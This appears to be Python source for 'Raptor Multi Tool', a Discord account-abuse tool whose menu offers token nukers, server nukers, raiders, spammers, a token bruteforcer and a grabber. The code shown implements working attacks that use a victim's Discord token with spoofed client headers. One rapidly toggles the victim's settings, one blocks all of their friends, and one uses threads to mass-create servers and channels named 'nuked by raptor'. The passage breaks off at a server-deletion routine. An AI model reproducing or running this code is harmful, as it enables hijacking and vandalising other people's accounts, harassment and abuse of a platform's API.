# Multi tool made by Aran, Tkn and Vivid <3

import colorama
from colorama import Fore
from selenium import webdriver
from discord.ext import commands
import discord, discum
import random, json
import requests, websocket
import string, pyautogui
import ctypes, os, sys
import webbrowser, base64
import time, threading


def tool():
  os.system('cls' if os.name=='nt' else 'clear')
  global nolist
  global yeslist

  nolist = ["no", "n", "nope", "nah", "ne","nay","never"]
  yeslist = ["yes", "y", "yer", "yeah","yessir","ye","okay","yep","yea","ok","k","yh","sure"]

  colorama.init()

  class MyClient(discord.Client):
    pass

  global options1
  def options1():
    
    os.system('cls' if os.name=='nt' else 'clear')
    ctypes.windll.kernel32.SetConsoleTitleW("Raptor Multi Tool <3")
    print(f'''
    {Fore.MAGENTA}                        	██████╗  █████╗ ██████╗ ████████╗ ██████╗ ██████╗ 
    {Fore.MAGENTA}                        	██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
    {Fore.MAGENTA}                        	██████╔╝███████║██████╔╝   ██║   ██║   ██║██████╔╝
    {Fore.LIGHTMAGENTA_EX}                        	██╔══██╗██╔══██║██╔═══╝    ██║   ██║   ██║██╔══██╗
    {Fore.LIGHTMAGENTA_EX}                        	██║  ██║██║  ██║██║        ██║   ╚██████╔╝██║  ██║
    {Fore.LIGHTMAGENTA_EX}                        	╚═╝  ╚═╝╚═╝  ╚═╝╚═╝        ╚═╝    ╚═════╝ ╚═╝  ╚═╝  
    ''')                           
    print(Fore.MAGENTA + '╔══════════════════════════════╦══════════════════════════╦══════════════════════════════╦══════════════════════════╗')
    print(Fore.MAGENTA +f'║     {Fore.RED}RAIDING/NUKING           {Fore.MAGENTA}║     {Fore.RED}GENERATORS           {Fore.MAGENTA}║     {Fore.RED}EXTRAS                   {Fore.MAGENTA}║     {Fore.RED}CREDITS             {Fore.MAGENTA} ║')
    print(Fore.MAGENTA + '║     [01] TOKEN JOINER        ║     [09] TOKENS          ║     [15] TOKEN BRUTEFORCER   ║     [23] CREDITS         ║')
    print(Fore.BLUE +    '║     [02] AIO WEBHOOK RAIDERS ║     [10] NITRO           ║     [16] TOKEN CHECKER       ║     [24] DISCORD         ║')
    print(Fore.BLUE +    '║     [03] AIO TOKEN NUKERS    ║     [11] PROXY           ║     [17] PFP CHANGER         ║     [25] YOUTUBE         ║')
    print(Fore.BLUE +    '║     [04] SERVER NUKER        ║     [12] GRABBER         ║     [18] BIO CHANGER         ║     [26] GITHUB          ║')
    print(Fore.CYAN+     '║     [05] SERVER SPAMMER      ║     [13] MEMBER IDS      ║     [19] HYPEQUAD CHANGER    ║     [27] ABOUT           ║')
    print(Fore.CYAN +    '║     [06] FRIEND SPAMMER      ║     [14] NAMES           ║     [20] TOKEN INFO          ║                          ║')
    print(Fore.CYAN +    '║     [07] ONLINER             ║                          ║     [21] TOKEN LOGIN         ║                          ║')
    print(Fore.MAGENTA +f'║     [08] TOKEN LEAVER        ║                          ║     {Fore.RED}[22] EXIT{Fore.RESET}{Fore.MAGENTA}                ║                          ║')   
    print(Fore.MAGENTA + '║                              ║                          ║                              ║                          ║')
    print(Fore.MAGENTA + '╚══════════════════════════════╩══════════════════════════╩══════════════════════════════╩══════════════════════════╝')
    global options
    options = input(Fore.RED + '[\>]')

  options1()

  privatechannelIds = []
  global cls
  def cls():
    os.system('cls' if os.name=='nt' else 'clear')

  global quit
  def quit():
    exit()

  def github():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Star Our Projects!")
    gh = input(f"""
{Fore.MAGENTA}   ____ _ _   _           _     
  / ___(_) |_| |__  _   _| |__  
 | |  _| | __| '_ \| | | | '_ \ 
{Fore.RED} | |_| | | |_| | | | |_| | |_) |
  \____|_|\__|_| |_|\__,_|_.__/ 
                                   
  [01] Aran's Github
  [02] Vivid's Github
  
  [\>]""")

    if gh in ['01','1']:
      webbrowser.open('https://github.com/Aran404')
    elif gh in ['02','2']:
      webbrowser.open('https://github.com/simonboiii')
    else:
      print('Not A Valid Option!')
  

  def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text

  global useragent
  def useragent():
    file = open('useragent.txt','r')
    useragent = (random.choice(list(file)))
    useragent2 = []
    useragent2.append(useragent)
    useragent1 = []

    for element in useragent2:
      useragent1.append(element.strip())
    finaluseragent = ''.join(str(e) for e in useragent1)
    return finaluseragent

  def tokennuke():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Token Nukers")
    options4 = input(f'''
{Fore.MAGENTA}  _____     _                _   _       _                 
 |_   _|__ | | _____ _ __   | \ | |_   _| | _____ _ __ ___ 
   | |/ _ \| |/ / _ \ '_ \  |  \| | | | | |/ / _ \ '__/ __|
{Fore.RED}   | | (_) |   <  __/ | | | | |\  | |_| |   <  __/ |  \__ |
   |_|\___/|_|\_\___|_| |_| |_| \_|\__,_|_|\_\___|_|  |___/
   {Fore.BLUE}
   [01] FLASHBANG
   [02] MASS CREATE SERVERS + CHANNELS
   [03] MASS BLOCK
   [04] DELETE ALL PERSONAL SERVERS 
   [05] LEAVE ALL SERVERS
   [06] {Fore.RESET}{Fore.RED}TOTAL KARNAGE{Fore.RESET}
   {Fore.BLUE}[07] EXIT
   
   [\>]''')
    if options4 in ['1','01']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Flashbang Inbound")
      url = 'https://discord.com/api/v9/users/@me/settings'

      print(f'''
{Fore.MAGENTA}  _____ _           _     _                       
 |  ___| | __ _ ___| |__ | |__   __ _ _ __   __ _ 
 | |_  | |/ _` / __| '_ \| '_ \ / _` | '_ \ / _` |
{Fore.RED} |  _| | | (_| \__ \ | | | |_) | (_| | | | | (_| |
 |_|   |_|\__,_|___/_| |_|_.__/ \__,_|_| |_|\__, |
                                            |___/ 
      ''')
      tukan = input("What is the token you want to mess up?: ")
      times = int(input("How many times do you want to blind the user of the token?: "))

      header = {
          "authority": "discord.com",
          "path": f"/api/v9/users/@me/settings",
          'method': 'PATCH',
          "scheme": "https",
          "accept": "*/*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "en-US",
          "Authorization": f"{tukan}",
          "content-length": "0",
          "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
          "origin": "https://discord.com",
          'referer': 'https://discord.com/channels/@me',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "user-agent": useragent(),
          "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
          "x-debug-options": "bugReporterEnabled",
          "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
      }

      changset = True
      payload = {"theme": "light", "developer_mode": changset, "afk_timeout": 60, "locale": "ko",
                  "message_display_compact": changset, "explicit_content_filter": 2,
                  "default_guilds_restricted": changset,
                  "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                          "mutual_guilds": changset},
                  "inline_embed_media": changset, "inline_attachment_media": changset,
                  "gif_auto_play": changset, "render_embeds": changset,
                  "render_reactions": changset, "animate_emoji": changset,
                  "convert_emoticons": changset, "animate_stickers": 1,
                  "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                  "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                  "stream_notifications_enabled": changset, "status": "idle",
                  "detect_platform_accounts": changset, "disable_games_tab": changset}

      changset = False
      payload2 = {"theme": "dark", "developer_mode": changset, "afk_timeout": 120, "locale": "bg",
                  "message_display_compact": changset, "explicit_content_filter": 0,
                  "default_guilds_restricted": changset,
                  "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                          "mutual_guilds": changset},
                  "inline_embed_media": changset, "inline_attachment_media": changset,
                  "gif_auto_play": changset, "render_embeds": changset,
                  "render_reactions": changset, "animate_emoji": changset,
                  "convert_emoticons": changset, "animate_stickers": 2,
                  "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                  "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                  "stream_notifications_enabled": changset, "status": "dnd",
                  "detect_platform_accounts": changset, "disable_games_tab": changset}


      for x in range(times):
          r = requests.patch(url,headers=header, json=payload)
          if r.status_code == 200:
              print("FLASHBANGED!")
          else:
              print(r)
          t = requests.patch(url,headers=header, json=payload2)
          if t.status_code == 200:
              print('FLASHBANGED!')
          else:
              print(t)

    elif options4 in ['3','03']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Mass Blocker")
      print(f'''
{Fore.MAGENTA}  __  __                 ____  _            _    
 |  \/  | __ _ ___ ___  | __ )| | ___   ___| | __
 | |\/| |/ _` / __/ __| |  _ \| |/ _ \ / __| |/ /
{Fore.RED} | |  | | (_| \__ \__ \ | |_) | | (_) | (__|   < 
 |_|  |_|\__,_|___/___/ |____/|_|\___/ \___|_|\_\                                              
      ''')

      tukan = input('What is the token you want to block all friends with?: ')

      url = 'https://discord.com/api/v9/users/@me/relationships'

      header = {
          "authority": "discord.com",
          "path": f"/api/v9/users/@me/relationships",
          "scheme": "https",
          "accept": "*/*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "en-US",
          "Authorization": f"{tukan}",
          "content-length": "0",
          "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
          "origin": "https://discord.com",
          'referer': 'https://discord.com/channels/@me',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "user-agent": useragent(),
          "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
          "x-debug-options": "bugReporterEnabled",
          "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
      }

      payload = {"type": 2}
      r = requests.get(url, headers=header).json()
      for x in r:
          e = requests.put(f'{url}/{x["id"]}', headers=header, json=payload)
          if e.status_code == 200 or 204:
              print(f"Successfully blocked {x['id']}")
          else:
            print(e)

    elif options4 in ['2','02']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Token Server + Channel Maker")

      print(Fore.MAGENTA + '''
   _____     _                _   _       _             
  |_   _|__ | | _____ _ __   | \ | |_   _| | _____ _ __ 
    | |/ _ \| |/ / _ \ '_ \  |  \| | | | | |/ / _ \ '__|
  \033[31m  | | (_) |   <  __/ | | | | |\  | |_| |   <  __/ |   
    |_|\___/|_|\_\___|_| |_| |_| \_|\__,_|_|\_\___|_|   
      ''')

      tukan1 = input("Enter the token you want to make servers + channels : ")
      url = 'https://discord.com/api/v9/guilds'

      header = {
          "authority": "discord.com",
          "method": "POST",
          "path": f"/api/v9/guilds",
          "scheme": "https",
          "accept": "*/*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "en-US",
          "Authorization": f"{tukan1}",
          "content-length": "0",
          "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
          "origin": "https://discord.com",
          'referer': 'https://discord.com/channels/@me',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "user-agent": useragent(),
          "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
          "x-debug-options": "bugReporterEnabled",
          "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
      }

      global ids
      ids = []

      def servercreate():
          image = "data:image/jpeg;base64,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"
          for x in range(15):
              try:
                r = requests.post(url,headers=header, json={'name':"Nuked By Raptor", 'icon':image})
                if r.status_code == 200 or 204 or 201:
                    print("Done!")
                    ids.append(r.json()['id'])
                else:
                    print("Failed")
              except Exception as e:
                print('Max Server Limit Acceded')

      def channelmake():
          length = len(ids)
          for b in range(length):
              for i in range(15):
                  url1 = f'https://discord.com/api/v9/guilds/{ids[b]}/channels'
                  r = requests.post(url1, headers=header, json={'name':'nuked-by-raptor'})

      threads = []

      for _ in range(20):
          t = threading.Thread(target=servercreate)
          t.daemon = True
          t.start()
          threads.append(t)

      for thread in threads:
          t.join()

      threaad = []

      for r in range(50):
          a = threading.Thread(target=channelmake)
          a.daemon = True
          a.start()
          threaad.append(a)

      for thread in threaad:
          a.join()

    elif options4 in ['4','04']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Delete All Servers")
      print(f'''
  {Fore.MAGENTA} ____                             ____       _      _            
  / ___|  ___ _ ____   _____ _ __  |  _ \  ___| | ___| |_ ___ _ __ 
  \___ \ / _ \ '__\ \ / / _ \ '__| | | | |/ _ \ |/ _ \ __/ _ \ '__|
  {Fore.RED} ___) |  __/ |   \ V /  __/ |    | |_| |  __/ |  __/ ||  __/ |   
  |____/ \___|_|    \_/ \___|_|    |____/ \___|_|\___|\__\___|_|   
                                                                    
      ''')
